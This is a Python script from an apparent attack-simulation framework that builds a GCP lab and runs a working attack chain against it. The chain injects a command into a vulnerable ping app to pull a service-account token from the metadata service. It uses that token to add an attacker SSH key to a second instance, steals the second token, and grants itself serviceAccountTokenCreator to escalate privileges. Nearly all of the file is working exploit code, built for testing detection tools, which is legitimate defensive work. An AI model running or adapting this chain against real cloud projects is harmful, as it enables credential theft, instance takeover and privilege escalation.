import os
import re
import subprocess
import json
import time
import urllib.parse
from time import sleep
from termcolor import colored
from core.helpers import loading_animation, generate_ssh_key

PULUMI_STACK_NAME = "cobra-scenario-9"
PULUMI_OUTPUT_JSON_PATH = "./core/cobra-scenario-9-output.json"
SSH_KEY_PATH = "./scenario_9_id_rsa"
ATTACKER_SSH_KEY_PATH = "./scenario_9_attacker_id_rsa"
ATTACKER_SSH_USER = "attacker"

CYTOOL_STATUS_CMD = "/opt/traps/bin/cytool status"
AGENT_CHECK_INTERVAL = 60  # seconds between agent status checks
MAX_AGENT_WAIT_TIME = 60 * 10  # 10 minutes max wait

# GCP IMDS endpoint for fetching the service account access token
IMDS_TOKEN_URL = (
    "http://metadata.google.internal/computeMetadata/v1/"
    "instance/service-accounts/default/token"
)

# Command injection payload: the semicolon terminates the ping command and
# executes curl against the GCP Instance Metadata Service (IMDS) to retrieve
# the OAuth2 access token associated with the instance's service account.
IMDS_CMD_INJECTION_PAYLOAD = (
    "; curl -s -H 'Metadata-Flavor: Google' " + IMDS_TOKEN_URL
)

# GCP Compute Engine REST API base URL
GCP_COMPUTE_API_BASE = "https://compute.googleapis.com/compute/v1"

# GCP IAM REST API base URL
GCP_IAM_API_BASE = "https://iam.googleapis.com/v1"


class ScenarioExecution:
    def __init__(self):
        self.instance_name = None
        self.instance_public_ip = None
        self.instance_id = None
        self.instance_zone = None
        self.service_account_email = None
        self.ssh_user = None
        self.web_app_url = None
        self.agent_included = False
        self.instance_2_name = None
        self.instance_2_public_ip = None
        self.instance_2_id = None
        self.instance_2_zone = None
        self.service_account_2_email = None
        self.gcp_project = None
        self.stolen_access_token = None
        self.stolen_access_token_2 = None

    def read_pulumi_config(self):
        """Read Pulumi stack outputs from the JSON file."""
        with open(PULUMI_OUTPUT_JSON_PATH, "r") as file:
            data = json.load(file)

        self.instance_name = data["Instance Name"]
        self.instance_public_ip = data["Instance Public IP"]
        self.instance_id = data["Instance ID"]
        self.instance_zone = data["Instance Zone"]
        self.service_account_email = data["Service Account Email"]
        self.ssh_user = data["SSH User"]
        self.web_app_url = data["Web App URL"]
        self.agent_included = data.get("Agent Included", False)
        self.instance_2_name = data["Instance 2 Name"]
        self.instance_2_public_ip = data["Instance 2 Public IP"]
        self.instance_2_id = data["Instance 2 ID"]
        self.instance_2_zone = data["Instance 2 Zone"]
        self.service_account_2_email = data["Service Account 2 Email"]
        self.gcp_project = data["GCP Project"]

    def init_infra(self):
        """Generate SSH keys and deploy Pulumi infrastructure."""
        if not os.path.exists(SSH_KEY_PATH):
            generate_ssh_key(SSH_KEY_PATH)
        else:
            print(colored(f"SSH key already exists at '{SSH_KEY_PATH}', reusing.", color="yellow"))

        if os.path.exists(PULUMI_OUTPUT_JSON_PATH):
            os.remove(PULUMI_OUTPUT_JSON_PATH)
            print("File '{}' found and deleted.".format(PULUMI_OUTPUT_JSON_PATH))
        else:
            print("File '{}' not found.".format(PULUMI_OUTPUT_JSON_PATH))

        subprocess.call(
            f"cd ./scenarios/scenario_9/infra/ && pulumi up -s {PULUMI_STACK_NAME} -y",
            shell=True,
        )
        subprocess.call(
            f"cd ./scenarios/scenario_9/infra/ && pulumi stack -s {PULUMI_STACK_NAME} output --json >> ../../../{PULUMI_OUTPUT_JSON_PATH}",
            shell=True,
        )

    def _wait_for_single_instance_running(self, instance_name, instance_zone):
        """Poll a single GCP compute instance status until it reaches RUNNING state."""
        print(colored(f"Waiting for instance '{instance_name}' to reach RUNNING status...", color="yellow"))
        max_attempts = 30
        for attempt in range(1, max_attempts + 1):
            try:
                result = subprocess.run(
                    f"gcloud compute instances describe {instance_name} --zone={instance_zone} --format='value(status)'",
                    shell=True, capture_output=True, text=True,
                )
                status = result.stdout.strip()
                if status == "RUNNING":
                    print(colored(f"Instance '{instance_name}' is RUNNING.", color="green"))
                    return True
                print(colored(f"  [{instance_name}] Attempt {attempt}/{max_attempts} - Current status: {status}", color="yellow"))
            except Exception as e:
                print(colored(f"  [{instance_name}] Attempt {attempt}/{max_attempts} - Error checking status: {e}", color="yellow"))
            sleep(10)
        print(colored(f"Instance '{instance_name}' did not reach RUNNING status after {max_attempts} attempts.", color="red"))
        return False

    def wait_for_instance_running(self):
        """Poll both GCP compute instances until they reach RUNNING state."""
        result_1 = self._wait_for_single_instance_running(self.instance_name, self.instance_zone)
        result_2 = self._wait_for_single_instance_running(self.instance_2_name, self.instance_2_zone)
        return result_1 and result_2

    def _check_single_agent_connected(self, instance_ip):
        """Check if the Cortex XDR agent EDR is enabled on a remote instance via SSH."""
        cmdline = (
            f"ssh -o StrictHostKeyChecking=no -i {SSH_KEY_PATH} "
            f"{self.ssh_user}@{instance_ip} 'sudo {CYTOOL_STATUS_CMD}'"
        )
        try:
            result = subprocess.run(cmdline, shell=True, capture_output=True, text=True)
            output = result.stdout
            edr_match = re.search(r"\nEDR\s+\w+\s+(\w+)\s+", output)
            if edr_match:
                return edr_match.group(1) == "Enabled"
        except Exception as e:
            print(colored(f"  Agent check error on {instance_ip}: {e}", color="yellow"))
        return False

    def check_agent_connected(self):
        """Check if the Cortex XDR agent EDR is enabled on both instances."""
        result_1 = self._check_single_agent_connected(self.instance_public_ip)
        result_2 = self._check_single_agent_connected(self.instance_2_public_ip)
        return result_1 and result_2

    def _wait_for_single_agent(self, instance_name, instance_ip):
        """Wait for the Cortex XDR agent EDR to become enabled on a single instance."""
        print(colored(f"Waiting for Cortex XDR agent EDR to be enabled on '{instance_name}'...", color="yellow"))
        time_waited = 0

        while True:
            if self._check_single_agent_connected(instance_ip):
                print(colored(f"Cortex XDR agent EDR enabled on '{instance_name}'!", color="green"))
                return True

            if time_waited >= MAX_AGENT_WAIT_TIME:
                print(colored(
                    f"Agent EDR on '{instance_name}' did not start within the timeout period. "
                    "The scenario will continue, but the agent may not be active.",
                    color="red",
                ))
                return False

            print(colored(
                f"  [{instance_name}] Agent not ready yet, retrying in {AGENT_CHECK_INTERVAL}s "
                f"(waited {time_waited}s / {MAX_AGENT_WAIT_TIME}s)...",
                color="yellow",
            ))
            time.sleep(AGENT_CHECK_INTERVAL)
            time_waited += AGENT_CHECK_INTERVAL

    def wait_for_agent(self):
        """Wait for the Cortex XDR agent EDR to become enabled on both instances."""
        result_1 = self._wait_for_single_agent(self.instance_name, self.instance_public_ip)
        result_2 = self._wait_for_single_agent(self.instance_2_name, self.instance_2_public_ip)
        return result_1 and result_2

    def scenario_9_execute(self, manual):
        """Deploy infrastructure and optionally run the attack simulation.

        When ``--manual`` is passed, only the infrastructure is deployed.
        The attack simulation can then be triggered separately via the
        ``post-launch`` action.
        """
        print("-" * 30)
        print(colored(
            "Executing Scenario 9 : GCP Cloud Detection and Response - Attack Simulation on GCP Environment",
            color="red",
        ))
        loading_animation()
        print("-" * 30)

        print(colored(
            "Please make sure that this scenario's Pulumi.yaml is properly configured for your specific environment.",
            "yellow",
        ))

        input("Press enter to continue...")

        print(colored("Rolling out Infra", color="red"))
        loading_animation()
        print("-" * 30)

        self.init_infra()

        print("-" * 30)
        print(colored("Infrastructure deployed successfully", color="green"))
        loading_animation()

        if manual:
            print(colored(
                "Using manual mode - use 'post-launch' to start the attack simulation",
                "yellow",
            ))
        else:
            self.post_execution()

    def post_execution(self):
        """Run the attack simulation against the already-deployed infrastructure."""
        print(colored("Starting attack simulation...", "cyan"))
        self.read_pulumi_config()

        print("-" * 30)
        print(colored("--- Instance 1 (Web App) ---", color="cyan"))
        print(colored(f"Instance Name: {self.instance_name}", color="cyan"))
        print(colored(f"Instance Public IP: {self.instance_public_ip}", color="cyan"))
        print(colored(f"Instance ID: {self.instance_id}", color="cyan"))
        print(colored(f"Instance Zone: {self.instance_zone}", color="cyan"))
        print(colored(f"Service Account: {self.service_account_email}", color="cyan"))
        print(colored(f"Web App URL: {self.web_app_url}", color="cyan"))
        print(colored(f"Agent Included: {self.agent_included}", color="cyan"))
        print(colored("--- Instance 2 (Plain) ---", color="cyan"))
        print(colored(f"Instance 2 Name: {self.instance_2_name}", color="cyan"))
        print(colored(f"Instance 2 Public IP: {self.instance_2_public_ip}", color="cyan"))
        print(colored(f"Instance 2 ID: {self.instance_2_id}", color="cyan"))
        print(colored(f"Instance 2 Zone: {self.instance_2_zone}", color="cyan"))
        print(colored(f"Service Account 2: {self.service_account_2_email}", color="cyan"))
        print("-" * 30)

        self.wait_for_instance_running()

        # If agent is included, wait for it to become active
        if self.agent_included:
            print("-" * 30)
            print(colored("Cortex XDR agent was included — waiting for agent to initialize...", color="yellow"))
            # Give the startup script time to download and install the agent
            print(colored("Waiting 60s for startup script to complete agent installation...", color="yellow"))
            time.sleep(60)
            self.wait_for_agent()
        else:
            print(colored("Agent not included in this deployment.", color="yellow"))

        print("-" * 30)
        print(colored("GCP Compute Instances are ready for attack simulation", color="green"))
        print("-" * 30)

        # ------------------------------------------------------------------
        # Payload 1 – Command injection to steal IMDS token from Instance 1
        # ------------------------------------------------------------------
        self._execute_imds_token_theft_via_cmd_injection()

        # ------------------------------------------------------------------
        # Payload 2 – Use stolen token to take over Instance 2
        # ------------------------------------------------------------------
        if not self.stolen_access_token:
            raise RuntimeError(
                "Payload 2 cannot proceed: no stolen token from Payload 1."
            )
        self._execute_instance_takeover()

        # ------------------------------------------------------------------
        # Payload 3 – Steal IMDS token from Instance 2 via SSH
        # ------------------------------------------------------------------
        self._execute_imds_token_theft_via_ssh()

        # ------------------------------------------------------------------
        # Payload 4 – Privilege escalation: bind serviceAccountTokenCreator
        # ------------------------------------------------------------------
        if not self.stolen_access_token_2:
            raise RuntimeError(
                "Payload 4 cannot proceed: no stolen SA2 token from Payload 3."
            )
        self._execute_privilege_escalation()

    # ------------------------------------------------------------------
    # Payload helpers
    # ------------------------------------------------------------------

    def _execute_imds_token_theft_via_cmd_injection(self):
        """Exploit the vulnerable ping web app to steal the GCP IMDS token.

        Sends a crafted request to the ``/ping`` endpoint on Instance 1.
        The ``address`` parameter contains a command injection payload that
        terminates the ``ping`` command and runs ``curl`` against the GCP
        Instance Metadata Service to retrieve the service account OAuth2
        access token.

        On success the stolen token is stored in ``self.stolen_access_token``
        so that subsequent payloads can reuse it.
        """
        print(colored(
            "Payload 1: Command injection → IMDS token theft on Instance 1",
            color="red",
        ))
        loading_animation()

        # URL-encode the injection payload so it travels safely in the
        # query-string while still being interpreted by the shell on the
        # server side.
        encoded_payload = urllib.parse.quote(IMDS_CMD_INJECTION_PAYLOAD)
        target_url = f"{self.web_app_url}{encoded_payload}"

        print(colored(f"Target URL: {target_url}", color="yellow"))
        print(colored("Sending command injection payload...", color="yellow"))

        try:
            result = subprocess.run(
                ["curl", "-s", target_url],
                capture_output=True,
                text=True,
                timeout=30,
            )

            if result.returncode != 0:
                print(colored(f"curl failed (rc={result.returncode}): {result.stderr}", color="red"))
                return

            print(colored("Response from vulnerable web app:", color="green"))
            print("-" * 30)

            # Try to parse the web-app JSON response and extract the
            # embedded IMDS token from the stdout field.
            try:
                response_json = json.loads(result.stdout)
                print(colored(f"Command executed: {response_json.get('command', 'N/A')}", color="cyan"))
                stdout_output = response_json.get("stdout", "")
                stderr_output = response_json.get("stderr", "")

                if stdout_output:
                    print(colored("stdout:", color="cyan"))
                    print(stdout_output)

                if stderr_output:
                    print(colored("stderr:", color="yellow"))
                    print(stderr_output)

                # The IMDS token JSON is embedded in the stdout after the
                # ping output.  Try to extract it.
                token_data = self._extract_imds_token(stdout_output)
                if token_data:
                    print("-" * 30)
                    print(colored("IMDS Token successfully stolen from Instance 1!", color="red"))
                    print(colored(f"Access Token: {token_data.get('access_token', 'N/A')[:20]}...", color="red"))
                    print(colored(f"Token Type: {token_data.get('token_type', 'N/A')}", color="red"))
                    print(colored(f"Expires In: {token_data.get('expires_in', 'N/A')}s", color="red"))
                    # Store the stolen token for use by subsequent payloads
                    self.stolen_access_token = token_data.get("access_token")
                else:
                    print(colored(
                        "Could not extract IMDS token from response. "
                        "The instance may not have reached the metadata server yet.",
                        color="yellow",
                    ))
            except json.JSONDecodeError:
                # If the response isn't valid JSON, print it raw
                print(result.stdout)

            print("-" * 30)

        except subprocess.TimeoutExpired:
            print(colored("Request timed out after 30s", color="red"))
        except Exception as e:
            print(colored(f"Error executing payload: {e}", color="red"))

    @staticmethod
    def _extract_imds_token(stdout_output):
        """Extract the IMDS token JSON from the command injection output.

        The ``stdout`` field returned by the vulnerable ping app contains
        the normal ``ping`` output followed by the raw JSON returned by the
        GCP metadata server.  This helper scans for the JSON object and
        parses it.

        Args:
            stdout_output: The ``stdout`` string from the web-app response.

        Returns:
            A dict with the token fields (``access_token``, ``token_type``,
            ``expires_in``) or ``None`` if extraction fails.
        """
        # Look for a JSON object containing "access_token" in the output
        match = re.search(r'\{[^{}]*"access_token"[^{}]*\}', stdout_output)
        if match:
            try:
                return json.loads(match.group(0))
            except json.JSONDecodeError:
                pass
        return None

    # ------------------------------------------------------------------
    # Payload 2 – Instance takeover via stolen IMDS token
    # ------------------------------------------------------------------

    def _execute_instance_takeover(self):
        """Use the stolen IMDS token to take over Instance 2 via SSH key injection.

        This method orchestrates the full Payload 2 attack:

        1. Generate a new attacker SSH key pair.
        2. Retrieve Instance 2's current metadata fingerprint using the
           stolen Bearer token (``GET instances.get``).
        3. Inject the attacker's SSH public key into Instance 2's metadata
           using the stolen Bearer token (``POST instances.setMetadata``).
        4. SSH into Instance 2 with the injected key and run ``hostname``
           to confirm the takeover.
        """
        print(colored(
            "Payload 2: Instance takeover → inject SSH key into Instance 2 "
            "using stolen IMDS token",
            color="red",
        ))
        loading_animation()

        # Step 1 – Generate attacker SSH key pair
        attacker_pub_key = self._generate_attacker_ssh_key()
        if not attacker_pub_key:
            print(colored("Failed to generate attacker SSH key. Aborting Payload 2.", color="red"))
            return

        # Step 2 – Get Instance 2 metadata fingerprint
        fingerprint, existing_items = self._get_instance_metadata_fingerprint()
        if not fingerprint:
            print(colored("Failed to retrieve Instance 2 metadata fingerprint. Aborting Payload 2.", color="red"))
            return

        # Step 3 – Inject attacker SSH key via setMetadata
        success = self._set_instance_metadata_ssh_key(attacker_pub_key, fingerprint, existing_items)
        if not success:
            print(colored("Failed to inject SSH key into Instance 2 metadata. Aborting Payload 2.", color="red"))
            return

        # Step 4 – Wait briefly for metadata propagation, then verify takeover
        print(colored("Waiting 10s for metadata propagation...", color="yellow"))
        time.sleep(10)
        self._verify_instance_takeover()

    def _generate_attacker_ssh_key(self):
        """Generate a new SSH key pair for the attacker to use during instance takeover.

        Returns:
            The public key content as a string, or ``None`` on failure.
        """
        print(colored("Generating attacker SSH key pair...", color="yellow"))

        if os.path.exists(ATTACKER_SSH_KEY_PATH):
            print(colored(
                f"Attacker SSH key already exists at '{ATTACKER_SSH_KEY_PATH}', reusing.",
                color="yellow",
            ))
        else:
            generate_ssh_key(ATTACKER_SSH_KEY_PATH)

        pub_key_path = ATTACKER_SSH_KEY_PATH + ".pub"
        try:
            with open(pub_key_path, "r") as f:
                pub_key = f.read().strip()
            print(colored(f"Attacker public key: {pub_key[:40]}...", color="cyan"))
            return pub_key
        except FileNotFoundError:
            print(colored(f"Public key file not found at {pub_key_path}", color="red"))
            return None

    def _get_instance_metadata_fingerprint(self):
        """Retrieve Instance 2's current metadata fingerprint via the GCP REST API.

        Uses ``curl`` with the stolen Bearer token to call
        ``GET /compute/v1/projects/{project}/zones/{zone}/instances/{instance}``.

        Returns:
            A tuple of ``(fingerprint, items)`` where ``fingerprint`` is the
            metadata fingerprint string and ``items`` is the list of existing
            metadata key/value dicts.  Returns ``(None, None)`` on failure.
        """
        print(colored("Retrieving Instance 2 metadata fingerprint...", color="yellow"))

        api_url = (
            f"{GCP_COMPUTE_API_BASE}/projects/{self.gcp_project}"
            f"/zones/{self.instance_2_zone}/instances/{self.instance_2_name}"
        )

        print(colored(f"GET {api_url}", color="yellow"))

        try:
            result = subprocess.run(
                [
                    "curl", "-s",
                    "-H", f"Authorization: Bearer {self.stolen_access_token}",
                    "-H", "Content-Type: application/json",
                    api_url,
                ],
                capture_output=True,
                text=True,
                timeout=30,
            )

            if result.returncode != 0:
                print(colored(f"curl failed (rc={result.returncode}): {result.stderr}", color="red"))
                return None, None

            response = json.loads(result.stdout)

            # Check for API error
            if "error" in response:
                error_msg = response["error"].get("message", "Unknown error")
                print(colored(f"GCP API error: {error_msg}", color="red"))
                return None, None

            metadata = response.get("metadata", {})
            fingerprint = metadata.get("fingerprint")
            items = metadata.get("items", [])

            if fingerprint:
                print(colored(f"Metadata fingerprint: {fingerprint}", color="green"))
                print(colored(f"Existing metadata items: {len(items)}", color="cyan"))
                for item in items:
                    key = item.get("key", "")
                    value = item.get("value", "")
                    # Truncate long values (like SSH keys) for display
                    display_value = value[:60] + "..." if len(value) > 60 else value
                    print(colored(f"  {key}: {display_value}", color="cyan"))
            else:
                print(colored("No fingerprint found in metadata response.", color="red"))

            return fingerprint, items

        except json.JSONDecodeError:
            print(colored("Failed to parse GCP API response as JSON.", color="red"))
            return None, None
        except subprocess.TimeoutExpired:
            print(colored("Request timed out after 30s", color="red"))
            return None, None
        except Exception as e:
            print(colored(f"Error retrieving metadata: {e}", color="red"))
            return None, None

    def _set_instance_metadata_ssh_key(self, attacker_pub_key, fingerprint, existing_items):
        """Inject the attacker's SSH key into Instance 2's metadata.

        Uses ``curl`` with the stolen Bearer token to call
        ``POST /compute/v1/projects/{project}/zones/{zone}/instances/{instance}/setMetadata``.

        The attacker's SSH key is appended to the existing ``ssh-keys``
        metadata value so the original keys are preserved (making the
        attack less obvious).

        Args:
            attacker_pub_key: The attacker's SSH public key content.
            fingerprint: The current metadata fingerprint from ``instances.get``.
            existing_items: The list of existing metadata items.

        Returns:
            ``True`` if the metadata was updated successfully, ``False`` otherwise.
        """
        print(colored("Injecting attacker SSH key into Instance 2 metadata...", color="red"))

        api_url = (
            f"{GCP_COMPUTE_API_BASE}/projects/{self.gcp_project}"
            f"/zones/{self.instance_2_zone}/instances/{self.instance_2_name}"
            f"/setMetadata"
        )

        # Build the new metadata items list, appending the attacker key
        # to the existing ssh-keys value.
        attacker_ssh_entry = f"{ATTACKER_SSH_USER}:{attacker_pub_key}"
        new_items = []
        ssh_keys_updated = False

        for item in existing_items:
            if item.get("key") == "ssh-keys":
                # Append attacker key to existing SSH keys
                existing_value = item.get("value", "")
                new_value = f"{existing_value}\n{attacker_ssh_entry}"
                new_items.append({"key": "ssh-keys", "value": new_value})
                ssh_keys_updated = True
            else:
                new_items.append(item)

        if not ssh_keys_updated:
            # No existing ssh-keys entry — create one
            new_items.append({"key": "ssh-keys", "value": attacker_ssh_entry})

        payload = {
            "fingerprint": fingerprint,
            "items": new_items,
        }

        payload_json = json.dumps(payload)
        print(colored(f"POST {api_url}", color="yellow"))
        print(colored(f"Payload: fingerprint={fingerprint}, items count={len(new_items)}", color="yellow"))

        try:
            result = subprocess.run(
                [
                    "curl", "-s",
                    "-X", "POST",
                    "-H", f"Authorization: Bearer {self.stolen_access_token}",
                    "-H", "Content-Type: application/json",
                    "-d", payload_json,
                    api_url,
                ],
                capture_output=True,
                text=True,
                timeout=30,
            )

            if result.returncode != 0:
                print(colored(f"curl failed (rc={result.returncode}): {result.stderr}", color="red"))
                return False

            response = json.loads(result.stdout)

            # Check for API error
            if "error" in response:
                error_msg = response["error"].get("message", "Unknown error")
                print(colored(f"GCP API error: {error_msg}", color="red"))
                return False

            # A successful setMetadata returns an operation object
            operation_status = response.get("status", "UNKNOWN")
            print(colored(f"setMetadata operation status: {operation_status}", color="green"))
            print(colored(
                "Attacker SSH key successfully injected into Instance 2 metadata!",
                color="red",
            ))
            return True

        except json.JSONDecodeError:
            print(colored("Failed to parse GCP API response as JSON.", color="red"))
            return False
        except subprocess.TimeoutExpired:
            print(colored("Request timed out after 30s", color="red"))
            return False
        except Exception as e:
            print(colored(f"Error setting metadata: {e}", color="red"))
            return False

    def _verify_instance_takeover(self):
        """SSH into Instance 2 using the injected attacker key to confirm takeover.

        Runs ``hostname`` on Instance 2 via SSH with the attacker's key.
        A successful connection proves the instance has been taken over.

        Raises:
            RuntimeError: If the SSH connection fails, indicating the
                takeover was not successful.
        """
        print(colored(
            "Verifying Instance 2 takeover — SSH with injected attacker key...",
            color="red",
        ))

        ssh_cmd = (
            f"ssh -o StrictHostKeyChecking=no -o ConnectTimeout=15 "
            f"-i {ATTACKER_SSH_KEY_PATH} "
            f"{ATTACKER_SSH_USER}@{self.instance_2_public_ip} 'hostname'"
        )

        print(colored(f"Running: {ssh_cmd}", color="yellow"))

        try:
            result = subprocess.run(
                ssh_cmd,
                shell=True,
                capture_output=True,
                text=True,
                timeout=30,
            )

            hostname_output = result.stdout.strip()

            if result.returncode == 0 and hostname_output:
                print("-" * 30)
                print(colored("INSTANCE 2 TAKEOVER CONFIRMED!", color="red"))
                print(colored(f"hostname: {hostname_output}", color="red"))
                print(colored(
                    f"Successfully SSH'd into {self.instance_2_name} "
                    f"({self.instance_2_public_ip}) as '{ATTACKER_SSH_USER}' "
                    f"using the injected SSH key.",
                    color="red",
                ))
                print("-" * 30)
            else:
                raise RuntimeError(
                    f"Instance 2 takeover failed — SSH connection returned "
                    f"rc={result.returncode}. stderr: {result.stderr.strip()}"
                )

        except subprocess.TimeoutExpired:
            raise RuntimeError("Instance 2 takeover failed — SSH connection timed out after 30s")

    # ------------------------------------------------------------------
    # Payload 3 – IMDS token theft from Instance 2 via SSH
    # ------------------------------------------------------------------

    def _execute_imds_token_theft_via_ssh(self):
        """Steal the IMDS token from Instance 2 by SSH-ing in with the injected key.

        After taking over Instance 2 (Payload 2), the attacker uses their
        SSH access to run ``curl`` against the GCP Instance Metadata Service
        from within Instance 2, retrieving the OAuth2 access token for the
        second service account (``cobra-scenario-9-sa-2``).

        On success the stolen token is stored in ``self.stolen_access_token_2``.

        Raises:
            RuntimeError: If the IMDS token cannot be retrieved.
        """
        print(colored(
            "Payload 3: IMDS token theft from Instance 2 via SSH",
            color="red",
        ))
        loading_animation()

        # Build the SSH command that curls the IMDS from inside Instance 2
        imds_curl = (
            "curl -s -H 'Metadata-Flavor: Google' "
            f"'{IMDS_TOKEN_URL}'"
        )
        ssh_cmd = (
            f"ssh -o StrictHostKeyChecking=no -o ConnectTimeout=15 "
            f"-i {ATTACKER_SSH_KEY_PATH} "
            f"{ATTACKER_SSH_USER}@{self.instance_2_public_ip} "
            f"\"{imds_curl}\""
        )

        print(colored(f"Running: {ssh_cmd}", color="yellow"))

        try:
            result = subprocess.run(
                ssh_cmd,
                shell=True,
                capture_output=True,
                text=True,
                timeout=30,
            )

            if result.returncode != 0:
                raise RuntimeError(
                    f"SSH command failed (rc={result.returncode}). "
                    f"stderr: {result.stderr.strip()}"
                )

            raw_output = result.stdout.strip()
            print(colored("Raw IMDS response from Instance 2:", color="cyan"))
            print(raw_output)

            # Parse the IMDS token JSON — try direct parse first, then
            # fall back to the regex-based extractor for noisy output.
            try:
                token_data = json.loads(raw_output)
            except json.JSONDecodeError:
                token_data = self._extract_imds_token(raw_output)

            if token_data and token_data.get("access_token"):
                print("-" * 30)
                print(colored(
                    "IMDS Token successfully stolen from Instance 2!",
                    color="red",
                ))
                print(colored(
                    f"Access Token: {token_data['access_token'][:20]}...",
                    color="red",
                ))
                print(colored(
                    f"Token Type: {token_data.get('token_type', 'N/A')}",
                    color="red",
                ))
                print(colored(
                    f"Expires In: {token_data.get('expires_in', 'N/A')}s",
                    color="red",
                ))
                print(colored(
                    f"Service Account: {self.service_account_2_email}",
                    color="red",
                ))
                print(colored(
                    "SA 2 has role: roles/iam.serviceAccountAdmin",
                    color="red",
                ))
                self.stolen_access_token_2 = token_data["access_token"]
                print("-" * 30)
            else:
                raise RuntimeError(
                    "Could not extract IMDS token from Instance 2 response."
                )

        except subprocess.TimeoutExpired:
            raise RuntimeError(
                "IMDS token theft from Instance 2 failed — "
                "SSH timed out after 30s"
            )

    # ------------------------------------------------------------------
    # Payload 4 – Privilege escalation via IAM role binding
    # ------------------------------------------------------------------

    def _execute_privilege_escalation(self):
        """Bind ``roles/iam.serviceAccountTokenCreator`` to SA2 using its own token.

        The attacker uses the stolen SA2 token (which has
        ``roles/iam.serviceAccountAdmin``) to grant SA2 the additional role
        ``roles/iam.serviceAccountTokenCreator``.  This is a privilege
        escalation — ``serviceAccountTokenCreator`` allows generating
        access tokens and ID tokens for *any* service account in the
        project, enabling further lateral movement.

        The attack uses the GCP IAM REST API:

        1. ``POST …:getIamPolicy`` — retrieve the current IAM policy on SA2.
        2. Add a new binding for ``roles/iam.serviceAccountTokenCreator``.
        3. ``POST …:setIamPolicy`` — write the updated policy back.

        Raises:
            RuntimeError: If the IAM policy update fails.
        """
        print(colored(
            "Payload 4: Privilege escalation → bind "
            "roles/iam.serviceAccountTokenCreator to SA2",
            color="red",
        ))
        loading_animation()

        sa_resource = (
            f"projects/{self.gcp_project}/serviceAccounts/"
            f"{self.service_account_2_email}"
        )

        # Step 1 – Get current IAM policy on SA2
        current_policy = self._get_sa_iam_policy(sa_resource)
        if current_policy is None:
            raise RuntimeError("Failed to retrieve IAM policy for SA2.")

        # Step 2 – Add the new binding
        new_role = "roles/iam.serviceAccountTokenCreator"
        new_member = f"serviceAccount:{self.service_account_2_email}"

        bindings = current_policy.get("bindings", [])
        # Check if the binding already exists
        existing_binding = next(
            (b for b in bindings if b.get("role") == new_role), None
        )
        if existing_binding:
            if new_member in existing_binding.get("members", []):
                print(colored(
                    f"Binding already exists: {new_role} → {new_member}",
                    color="yellow",
                ))
                return
            existing_binding["members"].append(new_member)
        else:
            bindings.append({
                "role": new_role,
                "members": [new_member],
            })

        current_policy["bindings"] = bindings

        print(colored(
            f"Adding binding: {new_role} → {new_member}",
            color="yellow",
        ))

        # Step 3 – Set the updated IAM policy
        self._set_sa_iam_policy(sa_resource, current_policy)

        print(colored(
            "Privilege escalation successful! SA2 now has "
            "roles/iam.serviceAccountTokenCreator.",
            color="red",
        ))

    def _get_sa_iam_policy(self, sa_resource):
        """Retrieve the IAM policy for a service account.

        Args:
            sa_resource: The full resource name
                (``projects/{project}/serviceAccounts/{email}``).

        Returns:
            The IAM policy dict, or ``None`` on failure.
        """
        api_url = f"{GCP_IAM_API_BASE}/{sa_resource}:getIamPolicy"
        print(colored(f"POST {api_url}", color="yellow"))

        try:
            result = subprocess.run(
                [
                    "curl", "-s",
                    "-X", "POST",
                    "-H", f"Authorization: Bearer {self.stolen_access_token_2}",
                    "-H", "Content-Type: application/json",
                    api_url,
                ],
                capture_output=True,
                text=True,
                timeout=30,
            )

            if result.returncode != 0:
                print(colored(
                    f"curl failed (rc={result.returncode}): {result.stderr}",
                    color="red",
                ))
                return None

            response = json.loads(result.stdout)

            if "error" in response:
                error_msg = response["error"].get("message", "Unknown error")
                print(colored(f"GCP IAM API error: {error_msg}", color="red"))
                return None

            print(colored(
                f"Current IAM policy: {len(response.get('bindings', []))} binding(s)",
                color="cyan",
            ))
            return response

        except json.JSONDecodeError:
            print(colored("Failed to parse IAM API response.", color="red"))
            return None
        except subprocess.TimeoutExpired:
            print(colored("Request timed out after 30s", color="red"))
            return None
        except Exception as e:
            print(colored(f"Error getting IAM policy: {e}", color="red"))
            return None

    def _set_sa_iam_policy(self, sa_resource, policy):
        """Set the IAM policy for a service account.

        Args:
            sa_resource: The full resource name.
            policy: The complete IAM policy dict to set.

        Raises:
            RuntimeError: If the API call fails.
        """
        api_url = f"{GCP_IAM_API_BASE}/{sa_resource}:setIamPolicy"
        payload = json.dumps({"policy": policy})

        print(colored(f"POST {api_url}", color="yellow"))

        try:
            result = subprocess.run(
                [
                    "curl", "-s",
                    "-X", "POST",
                    "-H", f"Authorization: Bearer {self.stolen_access_token_2}",
                    "-H", "Content-Type: application/json",
                    "-d", payload,
                    api_url,
                ],
                capture_output=True,
                text=True,
                timeout=30,
            )

            if result.returncode != 0:
                raise RuntimeError(
                    f"curl failed (rc={result.returncode}): {result.stderr}"
                )

            response = json.loads(result.stdout)

            if "error" in response:
                error_msg = response["error"].get("message", "Unknown error")
                raise RuntimeError(f"GCP IAM API error: {error_msg}")

            print(colored(
                f"IAM policy updated: {len(response.get('bindings', []))} binding(s)",
                color="green",
            ))

        except json.JSONDecodeError:
            raise RuntimeError("Failed to parse IAM API response.")
        except subprocess.TimeoutExpired:
            raise RuntimeError("Request timed out after 30s")

    def scenario_9_destroy(self):
        """Destroy the Pulumi infrastructure for scenario 9."""
        print(colored("Destroying infrastructure...", "yellow"))
        subprocess.call(
            f"cd ./scenarios/scenario_9/infra && pulumi destroy -s {PULUMI_STACK_NAME} --yes",
            shell=True,
        )

        # Clean up attacker SSH key files generated during the attack
        for key_file in [ATTACKER_SSH_KEY_PATH, ATTACKER_SSH_KEY_PATH + ".pub"]:
            if os.path.exists(key_file):
                os.remove(key_file)
                print(colored(f"Cleaned up attacker key: {key_file}", color="yellow"))
